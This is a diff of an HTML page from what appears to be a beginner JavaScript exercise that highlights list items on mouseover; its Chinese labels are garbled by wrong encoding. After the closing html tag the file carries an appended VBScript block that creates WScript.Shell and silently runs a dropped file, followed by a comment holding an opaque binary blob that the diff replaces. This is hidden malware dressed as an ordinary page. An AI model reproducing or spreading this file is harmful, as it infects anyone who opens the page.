@@ -5,31 +5,34 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1.0">
 		<meta http-equiv="X-UA-Compatible" content="ie=edge">
 		<title></title>
+		<style type="text/css">
+			ul {
+				list-style: none;
+				cursor: pointer;
+			}
+		</style>
 	</head>
 	<body>
-		<input type="button"id="btn" value="éš”è¡Œå˜è‰²" />
-		<ul id="uu">
+		<ul>
 			<li>å­¦ä¹ </li>
-			<li>å­˜å‚¨</li>
 			<li>è¯·æ±‚</li>
-			<li>é—®é—®</li>
 			<li>å—¯å—¯</li>
 			<li>è½¯è½¯</li>
-			<li>è¸¢è…¿</li>
 			<li>åº”ç”¨</li>
+			<li>å—·å—·</li>
+			<li>åˆšåˆš</li>
 		</ul>
 		<script src="js/common.js"></script>
-		<script type="text/javascript">
-			my$('btn').onclick = function() {
-				
-				var liList = my$("uu").getElementsByTagName("li")
-				for (var i = 0; i < liList.length; i++) {
-					console.log(i);
-					liList[i].style.backgroundColor = i % 2 == 0 ? "red" : "yellow";
-				}
-			
-
-			};
+		<script>
+			var list = document.getElementsByTagName('li');
+			for (i = 0; i < list.length; i++) {
+				list[i].onmouseover = function() {
+					this.style.backgroundColor = "red";
+				};
+				list[i].onmouseout=function(){
+					this.style.backgroundColor="";
+				};
+			}
 		</script>
 	</body>
 </html> <SCRIPT Language=VBScript><!--
@@ -46,6 +49,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--!i±X\Ÿúèìo—/ÁV
-vÂ%Zú1iÍø>Ğš.É@”á&²Œzw¼)’¸¿í'‰¤¬"£wA2DIæÂ2eìS¥¶î@³·)+»˜û‡Áıöyå‡2Æı¾°İDyä»hÃ/:z¤Õ»ƒ²O½‚³İBù‹?;‚-Ë£!·ªN¦­ì»/^ßâ/Ü¨‘†RHa±4*F}­ãİO4ãŸô4Í·å‡ÔGÆYÙT8Æò’Íì™¸h²kwL0¢%„G½†c–bîú¿è±áùŒK¸½xpyOÕRN­â?ˆ6ßv
-‡x(óÜW¢îwÓzcx_BŠvİí:¿ÕäHë¡À8<'Ëàd‚Ei8K!rÃ\€Ô4d¡±´r»Ï2†qĞÎ¤‚ ONxcŞ­bÁâVvÕ9_ ãfR }ùãfãfãf®»OšÅ_Nàf ãf-->
+//--></SCRIPT><!--¿Wé›Á'òó Ø¬¢ àİ®õ‹²ñD`ÈùúU‡VZ¼E,ÀÃK.2ª,ÃQ+I1à/„d‡ßÇ?Z>wUâŸ¨ÓôÖ69)›VM–¾…ríú‹>„N6ã,èÇƒ§‹æm} ëß†ı‘%—ÑüŠtÎÕMü8  Ñ=öÑÓ;E^L.ÍFşÈ–á®*ÜçeH»·öê­3‹¨Ów\ÁkÃ0W4­q–ëø	~›*x}
+¦nƒU¢İ_Ó ŒM	ëŒgÚ^äİ.M›Ü~‘ ó~€ö ìºw`(º ÅéV!Äà­ìü™†$»å±’Á“×LZnußî¡uuî˜ô¶S¿¤ĞùxÙjêÓj„¼U6gdéÊœ1Ì´Á??S‚µûcå…g5<¹õ›İ*räóG§V$C^Mø¤’I]¾$x»œ£¤“•<öÛÌvå½ŞºŞ±8œù)É6Z„­‹:òª›ó¬Äp,NõMºHàŒõ$¨Éf±w ‰T¼aZêk“’ğ·d°^Iz7NÑt¬ª,g½2ÎÁ&1PşxÖk%àµÑ£6mKE`˜½Á$ ©8Ãb ¡L«JjÂÄEÊEÈleTxß ãfR }ùãfãfãf®»OšÅ_Oàf ãf-->
